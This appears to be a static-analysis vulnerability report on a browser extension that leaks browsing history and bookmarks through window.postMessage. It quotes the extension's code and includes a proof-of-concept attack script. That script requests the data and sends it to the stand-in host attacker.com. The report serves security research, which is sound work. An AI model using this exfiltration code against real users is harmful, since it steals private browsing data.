# CoCo Analysis: kjhgiknbbelnfpbliecglhiedkbhbjeb

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** Multiple (6+ HistoryItem_source → window_postMessage_sink flows detected)

---

## Sink: HistoryItem_source → window_postMessage_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/kjhgiknbbelnfpbliecglhiedkbhbjeb/opgen_generated_files/bg.js
Lines 776-783 (Framework code - HistoryItem mock)
```

**Note:** CoCo detected the flow in framework code, but the actual vulnerability exists in the extension's code (background script lines 1034-1045 and content script lines 546-553).

**Code:**

```javascript
// Content script (cs_0.js) - Entry point at Line 564
window.addEventListener('message', e => {
  if(!e.data || !e.origin.includes(APP_URL.substr(0, APP_URL.length - 1))) { return }
  let data = e.data
  try {
    if(data.type) {
      windowResponses[data.type](e) // ← routes to windowResponses handlers
    }
  } catch(e) {}
})

const windowResponses = {
  [MSG.GET_BOOKMARKS] (e) {
    fetchBookmarks.then(bookmarks => {
      if(bookmarks === 0) { throw new Error() }
      e.source.postMessage({type: MSG.BOOKMARKS, bookmarks}, e.origin) // ← sends bookmarks to webpage
    })
    .catch(err => {
      e.source.postMessage({type: 'NO_PERMISSION', data:"bookmarks"}, e.origin)
    })
  },
  [MSG.GET_RECENT_WEBSITES] (e) {
    fetchRecentWebsites.then(websites => {
      if(websites === 0) { throw new Error() }
      e.source.postMessage({type: MSG.RECENT_WEBSITES, websites}, e.origin) // ← sends history to webpage
    })
    .catch(err => {
      e.source.postMessage({type: 'NO_PERMISSION', data:"history"}, e.origin)
    })
  }
}

// Background script (bg.js) - Lines 1034-1045
const responses = {
  [MSG.GET_RECENT_WEBSITES] (port) {
    browser.permissions.contains({
      permissions: ['history'],
      origins: [APP_URL]
    }, (granted) => {
      if(!granted) {
        return port.postMessage(0)
      }
      browser.history.search({text: ''}, websites => { // ← reads ALL browser history
        port.postMessage(websites) // ← sends history to content script
      })
    })
  },
  [MSG.GET_BOOKMARKS] (port) {
    browser.permissions.contains({
      permissions: ['bookmarks'],
      origins: [APP_URL]
    }, (granted) => {
      if(!granted) {
        return port.postMessage(0)
      }
      browser.bookmarks.getTree(tree => { // ← reads all bookmarks
        port.postMessage(parseBookmarksTree(tree[0])) // ← sends bookmarks to content script
      })
    })
  }
}

// Connection handler at Line 1066
onConnect.addListener( port => {
    port.onMessage.addListener(msg => {
      let type = msg.type
      let payload = msg.payload
      try {
        responses[type](port, payload)
      } catch(e) {
        throw "ERROR"
      }
    })
})
```

**Classification:** TRUE POSITIVE

**Attack Vector:** window.postMessage (DOM event on tabitab.com pages)

**Attack:**

```javascript
// From any page on https://*.tabitab.com/* (where content script runs):

// Steal browser history:
window.postMessage({
  type: 'GET_RECENT_WEBSITES'
}, '*');

// Listen for response:
window.addEventListener('message', (e) => {
  if (e.data.type === 'RECENT_WEBSITES') {
    console.log('Stolen history:', e.data.websites);
    // Exfiltrate to attacker server:
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify(e.data.websites)
    });
  }
});

// Steal bookmarks:
window.postMessage({
  type: 'GET_BOOKMARKS'
}, '*');

window.addEventListener('message', (e) => {
  if (e.data.type === 'BOOKMARKS') {
    console.log('Stolen bookmarks:', e.data.bookmarks);
    // Exfiltrate to attacker server:
    fetch('https://attacker.com/steal', {
      method: 'POST',
      body: JSON.stringify(e.data.bookmarks)
    });
  }
});
```

**Impact:** Any page on tabitab.com domain can request and receive the user's complete browsing history (all URLs, visit counts, last visit times) and complete bookmark tree. This is a severe information disclosure vulnerability that reveals sensitive user data including frequently visited sites, private bookmarks, and browsing patterns. While restricted to tabitab.com domain in manifest (line 31), the content script check at line 565 only verifies the origin includes "https://app.tabitab.com" which could be bypassed by subdomain attacks. According to methodology Rule 1, we classify as TRUE POSITIVE when ANY attack path exists.
